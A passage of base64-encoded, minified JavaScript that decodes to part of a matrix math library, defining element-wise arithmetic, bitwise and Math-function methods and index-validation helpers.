Gl2UyxvLnByb3RvdHlwZS5kaXZpZGVNPW8ucHJvdG90eXBlLmRpdk0sby5kaXZpZGU9by5kaXYsby5wcm90b3R5cGUubW9kPWZ1bmN0aW9uKHQpe3JldHVybiB0eXBlb2YgdD09Im51bWJlciI/dGhpcy5tb2RTKHQpOnRoaXMubW9kTSh0KX0sby5wcm90b3R5cGUubW9kUz1mdW5jdGlvbih0KXtmb3IobGV0IHM9MDtzPHRoaXMucm93cztzKyspZm9yKGxldCByPTA7cjx0aGlzLmNvbHVtbnM7cisrKXRoaXMuc2V0KHMscix0aGlzLmdldChzLHIpJXQpO3JldHVybiB0aGlzfSxvLnByb3RvdHlwZS5tb2RNPWZ1bmN0aW9uKHQpe2lmKHQ9bi5jaGVja01hdHJpeCh0KSx0aGlzLnJvd3MhPT10LnJvd3N8fHRoaXMuY29sdW1ucyE9PXQuY29sdW1ucyl0aHJvdyBuZXcgUmFuZ2VFcnJvcigiTWF0cmljZXMgZGltZW5zaW9ucyBtdXN0IGJlIGVxdWFsIik7Zm9yKGxldCBzPTA7czx0aGlzLnJvd3M7cysrKWZvcihsZXQgcj0wO3I8dGhpcy5jb2x1bW5zO3IrKyl0aGlzLnNldChzLHIsdGhpcy5nZXQocyxyKSV0LmdldChzLHIpKTtyZXR1cm4gdGhpc30sby5tb2Q9ZnVuY3Rpb24odCxzKXtyZXR1cm4gbmV3IG4odCkubW9kKHMpfSxvLnByb3RvdHlwZS5tb2R1bHVzPW8ucHJvdG90eXBlLm1vZCxvLnByb3RvdHlwZS5tb2R1bHVzUz1vLnByb3RvdHlwZS5tb2RTLG8ucHJvdG90eXBlLm1vZHVsdXNNPW8ucHJvdG90eXBlLm1vZE0sby5tb2R1bHVzPW8ubW9kLG8ucHJvdG90eXBlLmFuZD1mdW5jdGlvbih0KXtyZXR1cm4gdHlwZW9mIHQ9PSJudW1iZXIiP3RoaXMuYW5kUyh0KTp0aGlzLmFuZE0odCl9LG8ucHJvdG90eXBlLmFuZFM9ZnVuY3Rpb24odCl7Zm9yKGxldCBzPTA7czx0aGlzLnJvd3M7cysrKWZvcihsZXQgcj0wO3I8dGhpcy5jb2x1bW5zO3IrKyl0aGlzLnNldChzLHIsdGhpcy5nZXQocyxyKSZ0KTtyZXR1cm4gdGhpc30sby5wcm90b3R5cGUuYW5kTT1mdW5jdGlvbih0KXtpZih0PW4uY2hlY2tNYXRyaXgodCksdGhpcy5yb3dzIT09dC5yb3dzfHx0aGlzLmNvbHVtbnMhPT10LmNvbHVtbnMpdGhyb3cgbmV3IFJhbmdlRXJyb3IoIk1hdHJpY2VzIGRpbWVuc2lvbnMgbXVzdCBiZSBlcXVhbCIpO2ZvcihsZXQgcz0wO3M8dGhpcy5yb3dzO3MrKylmb3IobGV0IHI9MDtyPHRoaXMuY29sdW1ucztyKyspdGhpcy5zZXQocyxyLHRoaXMuZ2V0KHMscikmdC5nZXQocyxyKSk7cmV0dXJuIHRoaXN9LG8uYW5kPWZ1bmN0aW9uKHQscyl7cmV0dXJuIG5ldyBuKHQpLmFuZChzKX0sby5wcm90b3R5cGUub3I9ZnVuY3Rpb24odCl7cmV0dXJuIHR5cGVvZiB0PT0ibnVtYmVyIj90aGlzLm9yUyh0KTp0aGlzLm9yTSh0KX0sby5wcm90b3R5cGUub3JTPWZ1bmN0aW9uKHQpe2ZvcihsZXQgcz0wO3M8dGhpcy5yb3dzO3MrKylmb3IobGV0IHI9MDtyPHRoaXMuY29sdW1ucztyKyspdGhpcy5zZXQocyxyLHRoaXMuZ2V0KHMscil8dCk7cmV0dXJuIHRoaXN9LG8ucHJvdG90eXBlLm9yTT1mdW5jdGlvbih0KXtpZih0PW4uY2hlY2tNYXRyaXgodCksdGhpcy5yb3dzIT09dC5yb3dzfHx0aGlzLmNvbHVtbnMhPT10LmNvbHVtbnMpdGhyb3cgbmV3IFJhbmdlRXJyb3IoIk1hdHJpY2VzIGRpbWVuc2lvbnMgbXVzdCBiZSBlcXVhbCIpO2ZvcihsZXQgcz0wO3M8dGhpcy5yb3dzO3MrKylmb3IobGV0IHI9MDtyPHRoaXMuY29sdW1ucztyKyspdGhpcy5zZXQocyxyLHRoaXMuZ2V0KHMscil8dC5nZXQocyxyKSk7cmV0dXJuIHRoaXN9LG8ub3I9ZnVuY3Rpb24odCxzKXtyZXR1cm4gbmV3IG4odCkub3Iocyl9LG8ucHJvdG90eXBlLnhvcj1mdW5jdGlvbih0KXtyZXR1cm4gdHlwZW9mIHQ9PSJudW1iZXIiP3RoaXMueG9yUyh0KTp0aGlzLnhvck0odCl9LG8ucHJvdG90eXBlLnhvclM9ZnVuY3Rpb24odCl7Zm9yKGxldCBzPTA7czx0aGlzLnJvd3M7cysrKWZvcihsZXQgcj0wO3I8dGhpcy5jb2x1bW5zO3IrKyl0aGlzLnNldChzLHIsdGhpcy5nZXQocyxyKV50KTtyZXR1cm4gdGhpc30sby5wcm90b3R5cGUueG9yTT1mdW5jdGlvbih0KXtpZih0PW4uY2hlY2tNYXRyaXgodCksdGhpcy5yb3dzIT09dC5yb3dzfHx0aGlzLmNvbHVtbnMhPT10LmNvbHVtbnMpdGhyb3cgbmV3IFJhbmdlRXJyb3IoIk1hdHJpY2VzIGRpbWVuc2lvbnMgbXVzdCBiZSBlcXVhbCIpO2ZvcihsZXQgcz0wO3M8dGhpcy5yb3dzO3MrKylmb3IobGV0IHI9MDtyPHRoaXMuY29sdW1ucztyKyspdGhpcy5zZXQocyxyLHRoaXMuZ2V0KHMsciledC5nZXQocyxyKSk7cmV0dXJuIHRoaXN9LG8ueG9yPWZ1bmN0aW9uKHQscyl7cmV0dXJuIG5ldyBuKHQpLnhvcihzKX0sby5wcm90b3R5cGUubGVmdFNoaWZ0PWZ1bmN0aW9uKHQpe3JldHVybiB0eXBlb2YgdD09Im51bWJlciI/dGhpcy5sZWZ0U2hpZnRTKHQpOnRoaXMubGVmdFNoaWZ0TSh0KX0sby5wcm90b3R5cGUubGVmdFNoaWZ0Uz1mdW5jdGlvbih0KXtmb3IobGV0IHM9MDtzPHRoaXMucm93cztzKyspZm9yKGxldCByPTA7cjx0aGlzLmNvbHVtbnM7cisrKXRoaXMuc2V0KHMscix0aGlzLmdldChzLHIpPDx0KTtyZXR1cm4gdGhpc30sby5wcm90b3R5cGUubGVmdFNoaWZ0TT1mdW5jdGlvbih0KXtpZih0PW4uY2hlY2tNYXRyaXgodCksdGhpcy5yb3dzIT09dC5yb3dzfHx0aGlzLmNvbHVtbnMhPT10LmNvbHVtbnMpdGhyb3cgbmV3IFJhbmdlRXJyb3IoIk1hdHJpY2VzIGRpbWVuc2lvbnMgbXVzdCBiZSBlcXVhbCIpO2ZvcihsZXQgcz0wO3M8dGhpcy5yb3dzO3MrKylmb3IobGV0IHI9MDtyPHRoaXMuY29sdW1ucztyKyspdGhpcy5zZXQocyxyLHRoaXMuZ2V0KHMscik8PHQuZ2V0KHMscikpO3JldHVybiB0aGlzfSxvLmxlZnRTaGlmdD1mdW5jdGlvbih0LHMpe3JldHVybiBuZXcgbih0KS5sZWZ0U2hpZnQocyl9LG8ucHJvdG90eXBlLnNpZ25Qcm9wYWdhdGluZ1JpZ2h0U2hpZnQ9ZnVuY3Rpb24odCl7cmV0dXJuIHR5cGVvZiB0PT0ibnVtYmVyIj90aGlzLnNpZ25Qcm9wYWdhdGluZ1JpZ2h0U2hpZnRTKHQpOnRoaXMuc2lnblByb3BhZ2F0aW5nUmlnaHRTaGlmdE0odCl9LG8ucHJvdG90eXBlLnNpZ25Qcm9wYWdhdGluZ1JpZ2h0U2hpZnRTPWZ1bmN0aW9uKHQpe2ZvcihsZXQgcz0wO3M8dGhpcy5yb3dzO3MrKylmb3IobGV0IHI9MDtyPHRoaXMuY29sdW1ucztyKyspdGhpcy5zZXQocyxyLHRoaXMuZ2V0KHMscik+PnQpO3JldHVybiB0aGlzfSxvLnByb3RvdHlwZS5zaWduUHJvcGFnYXRpbmdSaWdodFNoaWZ0TT1mdW5jdGlvbih0KXtpZih0PW4uY2hlY2tNYXRyaXgodCksdGhpcy5yb3dzIT09dC5yb3dzfHx0aGlzLmNvbHVtbnMhPT10LmNvbHVtbnMpdGhyb3cgbmV3IFJhbmdlRXJyb3IoIk1hdHJpY2VzIGRpbWVuc2lvbnMgbXVzdCBiZSBlcXVhbCIpO2ZvcihsZXQgcz0wO3M8dGhpcy5yb3dzO3MrKylmb3IobGV0IHI9MDtyPHRoaXMuY29sdW1ucztyKyspdGhpcy5zZXQocyxyLHRoaXMuZ2V0KHMscik+PnQuZ2V0KHMscikpO3JldHVybiB0aGlzfSxvLnNpZ25Qcm9wYWdhdGluZ1JpZ2h0U2hpZnQ9ZnVuY3Rpb24odCxzKXtyZXR1cm4gbmV3IG4odCkuc2lnblByb3BhZ2F0aW5nUmlnaHRTaGlmdChzKX0sby5wcm90b3R5cGUucmlnaHRTaGlmdD1mdW5jdGlvbih0KXtyZXR1cm4gdHlwZW9mIHQ9PSJudW1iZXIiP3RoaXMucmlnaHRTaGlmdFModCk6dGhpcy5yaWdodFNoaWZ0TSh0KX0sby5wcm90b3R5cGUucmlnaHRTaGlmdFM9ZnVuY3Rpb24odCl7Zm9yKGxldCBzPTA7czx0aGlzLnJvd3M7cysrKWZvcihsZXQgcj0wO3I8dGhpcy5jb2x1bW5zO3IrKyl0aGlzLnNldChzLHIsdGhpcy5nZXQocyxyKT4+PnQpO3JldHVybiB0aGlzfSxvLnByb3RvdHlwZS5yaWdodFNoaWZ0TT1mdW5jdGlvbih0KXtpZih0PW4uY2hlY2tNYXRyaXgodCksdGhpcy5yb3dzIT09dC5yb3dzfHx0aGlzLmNvbHVtbnMhPT10LmNvbHVtbnMpdGhyb3cgbmV3IFJhbmdlRXJyb3IoIk1hdHJpY2VzIGRpbWVuc2lvbnMgbXVzdCBiZSBlcXVhbCIpO2ZvcihsZXQgcz0wO3M8dGhpcy5yb3dzO3MrKylmb3IobGV0IHI9MDtyPHRoaXMuY29sdW1ucztyKyspdGhpcy5zZXQocyxyLHRoaXMuZ2V0KHMscik+Pj50LmdldChzLHIpKTtyZXR1cm4gdGhpc30sby5yaWdodFNoaWZ0PWZ1bmN0aW9uKHQscyl7cmV0dXJuIG5ldyBuKHQpLnJpZ2h0U2hpZnQocyl9LG8ucHJvdG90eXBlLnplcm9GaWxsUmlnaHRTaGlmdD1vLnByb3RvdHlwZS5yaWdodFNoaWZ0LG8ucHJvdG90eXBlLnplcm9GaWxsUmlnaHRTaGlmdFM9by5wcm90b3R5cGUucmlnaHRTaGlmdFMsby5wcm90b3R5cGUuemVyb0ZpbGxSaWdodFNoaWZ0TT1vLnByb3RvdHlwZS5yaWdodFNoaWZ0TSxvLnplcm9GaWxsUmlnaHRTaGlmdD1vLnJpZ2h0U2hpZnQsby5wcm90b3R5cGUubm90PWZ1bmN0aW9uKCl7Zm9yKGxldCB0PTA7dDx0aGlzLnJvd3M7dCsrKWZvcihsZXQgcz0wO3M8dGhpcy5jb2x1bW5zO3MrKyl0aGlzLnNldCh0LHMsfnRoaXMuZ2V0KHQscykpO3JldHVybiB0aGlzfSxvLm5vdD1mdW5jdGlvbih0KXtyZXR1cm4gbmV3IG4odCkubm90KCl9LG8ucHJvdG90eXBlLmFicz1mdW5jdGlvbigpe2ZvcihsZXQgdD0wO3Q8dGhpcy5yb3dzO3QrKylmb3IobGV0IHM9MDtzPHRoaXMuY29sdW1ucztzKyspdGhpcy5zZXQodCxzLE1hdGguYWJzKHRoaXMuZ2V0KHQscykpKTtyZXR1cm4gdGhpc30sby5hYnM9ZnVuY3Rpb24odCl7cmV0dXJuIG5ldyBuKHQpLmFicygpfSxvLnByb3RvdHlwZS5hY29zPWZ1bmN0aW9uKCl7Zm9yKGxldCB0PTA7dDx0aGlzLnJvd3M7dCsrKWZvcihsZXQgcz0wO3M8dGhpcy5jb2x1bW5zO3MrKyl0aGlzLnNldCh0LHMsTWF0aC5hY29zKHRoaXMuZ2V0KHQscykpKTtyZXR1cm4gdGhpc30sby5hY29zPWZ1bmN0aW9uKHQpe3JldHVybiBuZXcgbih0KS5hY29zKCl9LG8ucHJvdG90eXBlLmFjb3NoPWZ1bmN0aW9uKCl7Zm9yKGxldCB0PTA7dDx0aGlzLnJvd3M7dCsrKWZvcihsZXQgcz0wO3M8dGhpcy5jb2x1bW5zO3MrKyl0aGlzLnNldCh0LHMsTWF0aC5hY29zaCh0aGlzLmdldCh0LHMpKSk7cmV0dXJuIHRoaXN9LG8uYWNvc2g9ZnVuY3Rpb24odCl7cmV0dXJuIG5ldyBuKHQpLmFjb3NoKCl9LG8ucHJvdG90eXBlLmFzaW49ZnVuY3Rpb24oKXtmb3IobGV0IHQ9MDt0PHRoaXMucm93czt0KyspZm9yKGxldCBzPTA7czx0aGlzLmNvbHVtbnM7cysrKXRoaXMuc2V0KHQscyxNYXRoLmFzaW4odGhpcy5nZXQodCxzKSkpO3JldHVybiB0aGlzfSxvLmFzaW49ZnVuY3Rpb24odCl7cmV0dXJuIG5ldyBuKHQpLmFzaW4oKX0sby5wcm90b3R5cGUuYXNpbmg9ZnVuY3Rpb24oKXtmb3IobGV0IHQ9MDt0PHRoaXMucm93czt0KyspZm9yKGxldCBzPTA7czx0aGlzLmNvbHVtbnM7cysrKXRoaXMuc2V0KHQscyxNYXRoLmFzaW5oKHRoaXMuZ2V0KHQscykpKTtyZXR1cm4gdGhpc30sby5hc2luaD1mdW5jdGlvbih0KXtyZXR1cm4gbmV3IG4odCkuYXNpbmgoKX0sby5wcm90b3R5cGUuYXRhbj1mdW5jdGlvbigpe2ZvcihsZXQgdD0wO3Q8dGhpcy5yb3dzO3QrKylmb3IobGV0IHM9MDtzPHRoaXMuY29sdW1ucztzKyspdGhpcy5zZXQodCxzLE1hdGguYXRhbih0aGlzLmdldCh0LHMpKSk7cmV0dXJuIHRoaXN9LG8uYXRhbj1mdW5jdGlvbih0KXtyZXR1cm4gbmV3IG4odCkuYXRhbigpfSxvLnByb3RvdHlwZS5hdGFuaD1mdW5jdGlvbigpe2ZvcihsZXQgdD0wO3Q8dGhpcy5yb3dzO3QrKylmb3IobGV0IHM9MDtzPHRoaXMuY29sdW1ucztzKyspdGhpcy5zZXQodCxzLE1hdGguYXRhbmgodGhpcy5nZXQodCxzKSkpO3JldHVybiB0aGlzfSxvLmF0YW5oPWZ1bmN0aW9uKHQpe3JldHVybiBuZXcgbih0KS5hdGFuaCgpfSxvLnByb3RvdHlwZS5jYnJ0PWZ1bmN0aW9uKCl7Zm9yKGxldCB0PTA7dDx0aGlzLnJvd3M7dCsrKWZvcihsZXQgcz0wO3M8dGhpcy5jb2x1bW5zO3MrKyl0aGlzLnNldCh0LHMsTWF0aC5jYnJ0KHRoaXMuZ2V0KHQscykpKTtyZXR1cm4gdGhpc30sby5jYnJ0PWZ1bmN0aW9uKHQpe3JldHVybiBuZXcgbih0KS5jYnJ0KCl9LG8ucHJvdG90eXBlLmNlaWw9ZnVuY3Rpb24oKXtmb3IobGV0IHQ9MDt0PHRoaXMucm93czt0KyspZm9yKGxldCBzPTA7czx0aGlzLmNvbHVtbnM7cysrKXRoaXMuc2V0KHQscyxNYXRoLmNlaWwodGhpcy5nZXQodCxzKSkpO3JldHVybiB0aGlzfSxvLmNlaWw9ZnVuY3Rpb24odCl7cmV0dXJuIG5ldyBuKHQpLmNlaWwoKX0sby5wcm90b3R5cGUuY2x6MzI9ZnVuY3Rpb24oKXtmb3IobGV0IHQ9MDt0PHRoaXMucm93czt0KyspZm9yKGxldCBzPTA7czx0aGlzLmNvbHVtbnM7cysrKXRoaXMuc2V0KHQscyxNYXRoLmNsejMyKHRoaXMuZ2V0KHQscykpKTtyZXR1cm4gdGhpc30sby5jbHozMj1mdW5jdGlvbih0KXtyZXR1cm4gbmV3IG4odCkuY2x6MzIoKX0sby5wcm90b3R5cGUuY29zPWZ1bmN0aW9uKCl7Zm9yKGxldCB0PTA7dDx0aGlzLnJvd3M7dCsrKWZvcihsZXQgcz0wO3M8dGhpcy5jb2x1bW5zO3MrKyl0aGlzLnNldCh0LHMsTWF0aC5jb3ModGhpcy5nZXQodCxzKSkpO3JldHVybiB0aGlzfSxvLmNvcz1mdW5jdGlvbih0KXtyZXR1cm4gbmV3IG4odCkuY29zKCl9LG8ucHJvdG90eXBlLmNvc2g9ZnVuY3Rpb24oKXtmb3IobGV0IHQ9MDt0PHRoaXMucm93czt0KyspZm9yKGxldCBzPTA7czx0aGlzLmNvbHVtbnM7cysrKXRoaXMuc2V0KHQscyxNYXRoLmNvc2godGhpcy5nZXQodCxzKSkpO3JldHVybiB0aGlzfSxvLmNvc2g9ZnVuY3Rpb24odCl7cmV0dXJuIG5ldyBuKHQpLmNvc2goKX0sby5wcm90b3R5cGUuZXhwPWZ1bmN0aW9uKCl7Zm9yKGxldCB0PTA7dDx0aGlzLnJvd3M7dCsrKWZvcihsZXQgcz0wO3M8dGhpcy5jb2x1bW5zO3MrKyl0aGlzLnNldCh0LHMsTWF0aC5leHAodGhpcy5nZXQodCxzKSkpO3JldHVybiB0aGlzfSxvLmV4cD1mdW5jdGlvbih0KXtyZXR1cm4gbmV3IG4odCkuZXhwKCl9LG8ucHJvdG90eXBlLmV4cG0xPWZ1bmN0aW9uKCl7Zm9yKGxldCB0PTA7dDx0aGlzLnJvd3M7dCsrKWZvcihsZXQgcz0wO3M8dGhpcy5jb2x1bW5zO3MrKyl0aGlzLnNldCh0LHMsTWF0aC5leHBtMSh0aGlzLmdldCh0LHMpKSk7cmV0dXJuIHRoaXN9LG8uZXhwbTE9ZnVuY3Rpb24odCl7cmV0dXJuIG5ldyBuKHQpLmV4cG0xKCl9LG8ucHJvdG90eXBlLmZsb29yPWZ1bmN0aW9uKCl7Zm9yKGxldCB0PTA7dDx0aGlzLnJvd3M7dCsrKWZvcihsZXQgcz0wO3M8dGhpcy5jb2x1bW5zO3MrKyl0aGlzLnNldCh0LHMsTWF0aC5mbG9vcih0aGlzLmdldCh0LHMpKSk7cmV0dXJuIHRoaXN9LG8uZmxvb3I9ZnVuY3Rpb24odCl7cmV0dXJuIG5ldyBuKHQpLmZsb29yKCl9LG8ucHJvdG90eXBlLmZyb3VuZD1mdW5jdGlvbigpe2ZvcihsZXQgdD0wO3Q8dGhpcy5yb3dzO3QrKylmb3IobGV0IHM9MDtzPHRoaXMuY29sdW1ucztzKyspdGhpcy5zZXQodCxzLE1hdGguZnJvdW5kKHRoaXMuZ2V0KHQscykpKTtyZXR1cm4gdGhpc30sby5mcm91bmQ9ZnVuY3Rpb24odCl7cmV0dXJuIG5ldyBuKHQpLmZyb3VuZCgpfSxvLnByb3RvdHlwZS5sb2c9ZnVuY3Rpb24oKXtmb3IobGV0IHQ9MDt0PHRoaXMucm93czt0KyspZm9yKGxldCBzPTA7czx0aGlzLmNvbHVtbnM7cysrKXRoaXMuc2V0KHQscyxNYXRoLmxvZyh0aGlzLmdldCh0LHMpKSk7cmV0dXJuIHRoaXN9LG8ubG9nPWZ1bmN0aW9uKHQpe3JldHVybiBuZXcgbih0KS5sb2coKX0sby5wcm90b3R5cGUubG9nMXA9ZnVuY3Rpb24oKXtmb3IobGV0IHQ9MDt0PHRoaXMucm93czt0KyspZm9yKGxldCBzPTA7czx0aGlzLmNvbHVtbnM7cysrKXRoaXMuc2V0KHQscyxNYXRoLmxvZzFwKHRoaXMuZ2V0KHQscykpKTtyZXR1cm4gdGhpc30sby5sb2cxcD1mdW5jdGlvbih0KXtyZXR1cm4gbmV3IG4odCkubG9nMXAoKX0sby5wcm90b3R5cGUubG9nMTA9ZnVuY3Rpb24oKXtmb3IobGV0IHQ9MDt0PHRoaXMucm93czt0KyspZm9yKGxldCBzPTA7czx0aGlzLmNvbHVtbnM7cysrKXRoaXMuc2V0KHQscyxNYXRoLmxvZzEwKHRoaXMuZ2V0KHQscykpKTtyZXR1cm4gdGhpc30sby5sb2cxMD1mdW5jdGlvbih0KXtyZXR1cm4gbmV3IG4odCkubG9nMTAoKX0sby5wcm90b3R5cGUubG9nMj1mdW5jdGlvbigpe2ZvcihsZXQgdD0wO3Q8dGhpcy5yb3dzO3QrKylmb3IobGV0IHM9MDtzPHRoaXMuY29sdW1ucztzKyspdGhpcy5zZXQodCxzLE1hdGgubG9nMih0aGlzLmdldCh0LHMpKSk7cmV0dXJuIHRoaXN9LG8ubG9nMj1mdW5jdGlvbih0KXtyZXR1cm4gbmV3IG4odCkubG9nMigpfSxvLnByb3RvdHlwZS5yb3VuZD1mdW5jdGlvbigpe2ZvcihsZXQgdD0wO3Q8dGhpcy5yb3dzO3QrKylmb3IobGV0IHM9MDtzPHRoaXMuY29sdW1ucztzKyspdGhpcy5zZXQodCxzLE1hdGgucm91bmQodGhpcy5nZXQodCxzKSkpO3JldHVybiB0aGlzfSxvLnJvdW5kPWZ1bmN0aW9uKHQpe3JldHVybiBuZXcgbih0KS5yb3VuZCgpfSxvLnByb3RvdHlwZS5zaWduPWZ1bmN0aW9uKCl7Zm9yKGxldCB0PTA7dDx0aGlzLnJvd3M7dCsrKWZvcihsZXQgcz0wO3M8dGhpcy5jb2x1bW5zO3MrKyl0aGlzLnNldCh0LHMsTWF0aC5zaWduKHRoaXMuZ2V0KHQscykpKTtyZXR1cm4gdGhpc30sby5zaWduPWZ1bmN0aW9uKHQpe3JldHVybiBuZXcgbih0KS5zaWduKCl9LG8ucHJvdG90eXBlLnNpbj1mdW5jdGlvbigpe2ZvcihsZXQgdD0wO3Q8dGhpcy5yb3dzO3QrKylmb3IobGV0IHM9MDtzPHRoaXMuY29sdW1ucztzKyspdGhpcy5zZXQodCxzLE1hdGguc2luKHRoaXMuZ2V0KHQscykpKTtyZXR1cm4gdGhpc30sby5zaW49ZnVuY3Rpb24odCl7cmV0dXJuIG5ldyBuKHQpLnNpbigpfSxvLnByb3RvdHlwZS5zaW5oPWZ1bmN0aW9uKCl7Zm9yKGxldCB0PTA7dDx0aGlzLnJvd3M7dCsrKWZvcihsZXQgcz0wO3M8dGhpcy5jb2x1bW5zO3MrKyl0aGlzLnNldCh0LHMsTWF0aC5zaW5oKHRoaXMuZ2V0KHQscykpKTtyZXR1cm4gdGhpc30sby5zaW5oPWZ1bmN0aW9uKHQpe3JldHVybiBuZXcgbih0KS5zaW5oKCl9LG8ucHJvdG90eXBlLnNxcnQ9ZnVuY3Rpb24oKXtmb3IobGV0IHQ9MDt0PHRoaXMucm93czt0KyspZm9yKGxldCBzPTA7czx0aGlzLmNvbHVtbnM7cysrKXRoaXMuc2V0KHQscyxNYXRoLnNxcnQodGhpcy5nZXQodCxzKSkpO3JldHVybiB0aGlzfSxvLnNxcnQ9ZnVuY3Rpb24odCl7cmV0dXJuIG5ldyBuKHQpLnNxcnQoKX0sby5wcm90b3R5cGUudGFuPWZ1bmN0aW9uKCl7Zm9yKGxldCB0PTA7dDx0aGlzLnJvd3M7dCsrKWZvcihsZXQgcz0wO3M8dGhpcy5jb2x1bW5zO3MrKyl0aGlzLnNldCh0LHMsTWF0aC50YW4odGhpcy5nZXQodCxzKSkpO3JldHVybiB0aGlzfSxvLnRhbj1mdW5jdGlvbih0KXtyZXR1cm4gbmV3IG4odCkudGFuKCl9LG8ucHJvdG90eXBlLnRhbmg9ZnVuY3Rpb24oKXtmb3IobGV0IHQ9MDt0PHRoaXMucm93czt0KyspZm9yKGxldCBzPTA7czx0aGlzLmNvbHVtbnM7cysrKXRoaXMuc2V0KHQscyxNYXRoLnRhbmgodGhpcy5nZXQodCxzKSkpO3JldHVybiB0aGlzfSxvLnRhbmg9ZnVuY3Rpb24odCl7cmV0dXJuIG5ldyBuKHQpLnRhbmgoKX0sby5wcm90b3R5cGUudHJ1bmM9ZnVuY3Rpb24oKXtmb3IobGV0IHQ9MDt0PHRoaXMucm93czt0KyspZm9yKGxldCBzPTA7czx0aGlzLmNvbHVtbnM7cysrKXRoaXMuc2V0KHQscyxNYXRoLnRydW5jKHRoaXMuZ2V0KHQscykpKTtyZXR1cm4gdGhpc30sby50cnVuYz1mdW5jdGlvbih0KXtyZXR1cm4gbmV3IG4odCkudHJ1bmMoKX0sby5wb3c9ZnVuY3Rpb24odCxzKXtyZXR1cm4gbmV3IG4odCkucG93KHMpfSxvLnByb3RvdHlwZS5wb3c9ZnVuY3Rpb24odCl7cmV0dXJuIHR5cGVvZiB0PT0ibnVtYmVyIj90aGlzLnBvd1ModCk6dGhpcy5wb3dNKHQpfSxvLnByb3RvdHlwZS5wb3dTPWZ1bmN0aW9uKHQpe2ZvcihsZXQgcz0wO3M8dGhpcy5yb3dzO3MrKylmb3IobGV0IHI9MDtyPHRoaXMuY29sdW1ucztyKyspdGhpcy5zZXQocyxyLE1hdGgucG93KHRoaXMuZ2V0KHMsciksdCkpO3JldHVybiB0aGlzfSxvLnByb3RvdHlwZS5wb3dNPWZ1bmN0aW9uKHQpe2lmKHQ9bi5jaGVja01hdHJpeCh0KSx0aGlzLnJvd3MhPT10LnJvd3N8fHRoaXMuY29sdW1ucyE9PXQuY29sdW1ucyl0aHJvdyBuZXcgUmFuZ2VFcnJvcigiTWF0cmljZXMgZGltZW5zaW9ucyBtdXN0IGJlIGVxdWFsIik7Zm9yKGxldCBzPTA7czx0aGlzLnJvd3M7cysrKWZvcihsZXQgcj0wO3I8dGhpcy5jb2x1bW5zO3IrKyl0aGlzLnNldChzLHIsTWF0aC5wb3codGhpcy5nZXQocyxyKSx0LmdldChzLHIpKSk7cmV0dXJuIHRoaXN9fWZ1bmN0aW9uIFEobyxuLGUpe2xldCB0PWU/by5yb3dzOm8ucm93cy0xO2lmKG48MHx8bj50KXRocm93IG5ldyBSYW5nZUVycm9yKCJSb3cgaW5kZXggb3V0IG9mIHJhbmdlIil9ZnVuY3Rpb24gWihvLG4sZSl7bGV0IHQ9ZT9vLmNvbHVtbnM6by5jb2x1bW5zLTE7aWYobjwwfHxuPnQpdGhyb3cgbmV3IFJhbmdlRXJyb3IoIkNvbHVtbiBpbmRleCBvdXQgb2YgcmFuZ2UiKX1mdW5jdGlvbiB0dChvLG4pe2lmKG4udG8xREFycmF5JiYobj1uLnRvMURBcnJheSgpKSxuLmxlbmd0aCE9PW8uY29sdW1ucyl0aHJvdyBuZXcgUmFuZ2VFcnJvcigidmVjdG9yIHNpemUgbXVzdCBiZSB0aGUgc2FtZSBhcyB0aGUgbnVtYmVyIG9mIGNvbHVtbnMiKTtyZXR1cm4gbn1mdW5jdGlvbiBldChvLG4pe2lmKG4udG8xREFycmF5JiYobj1uLnRvMURBcnJheSgpKSxuLmxlbmd0aCE9PW8ucm93cyl0aHJvdyBuZXcgUmFuZ2VFcnJvcigidmVjdG9yIHNpemUgbXVzdCBiZSB0aGUgc2FtZSBhcyB0aGUgbnVtYmVyIG9mIHJvd3MiKTtyZXR1cm4gbn1mdW5jdGlvbiBpZShvLG4pe2lmKCFXKG4pKXRocm93IG5ldyBUeXBlRXJyb3IoInJvdyBpbmRpY2VzIG11c3QgYmUgYW4gYXJyYXkiKTtmb3IobGV0IGU9MDtlPG4ubGVuZ3RoO2UrKylpZihuW2VdPDB8fG5bZV0+PW8ucm93cyl0aHJvdyBuZXcgUmFuZ2VFcnJvcigicm93IGluZGljZXMgYXJlIG91dCBvZiByYW5nZSIpfWZ1bmN0aW9uIGxlKG8sbil7aWYoIVcobikpdGhyb3cgbmV3IFR5cGVFcnJvcigiY29sdW1uIGluZGljZXMgbXVzdCBiZSBhbiBhcnJheSIpO2ZvcihsZXQgZT0wO2U8bi5sZW5ndGg7ZSsrKWlmKG5bZV08MHx8bltlXT49by5jb2x1bW5zKXRocm93IG5ldyBSYW5nZUVycm9yKCJjb2x1bW4gaW5kaWNlcyBhcmUgb3V0IG9mIHJhbmdlIil9ZnVuY3Rpb24gRnQobyxuLGUsdCxzKXtpZihhcmd1bWVudHMubGVuZ3RoIT09NSl0aHJvdyBuZXcgUmFuZ2VFcnJvcigiZXhwZWN0ZWQgNCBhcmd1bWVudHMiKTtpZihhdCgic3RhcnRSb3ciLG4pLGF0KCJlbmRSb3ciLGUpLGF0KCJzdGFydENvbHVtbiIsdCksYXQoImVuZENvbHVtbiIscyksbj5lfHx0PnN8fG48MHx8bj49by5yb3dzfHxlPDB8fGU+PW8ucm93c3x8dDwwfHx0Pj1vLmNvbHVtbnN8fHM8MHx8cz49by5jb2x1bW5zKXRocm93IG5ldyBSYW5nZUVycm9yKCJTdWJtYXRyaXggaW5kaWNlcyBhcmUgb3V0IG9mIHJhbmdlIil9ZnVuY3Rpb24gZ3QobyxuPTApe2xldCBlPVtdO2ZvcihsZXQgdD0wO3Q8bzt0KyspZS5wdXNoKG4pO3JldHVybiBlfWZ1bmN0aW9uIGF0KG8sbil7aWYodHlwZW9mIG4hPSJudW1iZXIiKXRocm93IG5ldyBUeXBlRXJyb3IoYCR7b30gbXVzdCBiZSBhIG51bWJlcmApfWZ1bmN0aW9uIG50KG8pe2lmKG8uaXNFbXB0eSgpKXRocm93IG5ldyBFcnJvcigiRW1wdHkgbWF0cml4IGhhcyBubyBlbGVtZW50cyB0byBpbmRleCIpfWZ1bmN0aW9uIGhlKG8pe2xldCBuPWd0KG8ucm93cyk7Zm9yKGxldCBlPTA7ZTxvLnJvd3M7KytlKWZvcihsZXQgdD0wO3Q8by5jb2x1bW5zOysrdCluW2VdKz1vLmdldChlLHQpO3JldHVybiBufWZ1bmN0aW9uIHVlKG8pe2xldCBuPWd0KG8uY29sdW1ucyk7Zm9yKGxldCBlPTA7ZTxvLnJvd3M7KytlKWZvcihsZXQgdD0wO3Q8by5jb2x1bW5zOysrdCluW3RdKz1vLmdldChlLHQpO3JldHVybiBufWZ1bmN0aW9uIGNlKG8pe2xldCBuPTA7Zm9yKGxldCBlPTA7ZTxvLnJvd3M7